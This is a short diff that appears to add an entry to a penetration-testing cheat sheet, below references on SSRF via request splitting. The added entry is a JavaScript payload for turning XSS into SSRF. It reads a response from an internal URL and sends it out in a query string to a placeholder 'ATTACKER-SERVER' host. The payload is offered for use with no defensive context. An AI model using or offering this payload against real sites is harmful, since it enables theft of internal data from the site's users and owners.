@@ -36,3 +36,14 @@ print("[@] Response Body ", req.text)
 > 1. https://www-rfk-id-au.translate.goog/blog/entry/security-bugs-ssrf-via-request-splitting
 > 2. https://hackerone.com/reports/409943
 
+# SSRF
+Leveraging XSS to SSRF
+```
+var request1 = new XMLHttpRequest();
+request1.open('GET', "<SSRF-URL>", false);
+request1.send()
+var response1 = request1.responseText;
+var request2 = new XMLHttpRequest();
+request2.open('GET', 'http://ATTACKER-SERVER/?meow=' + response1, true);
+request2.send()
+```
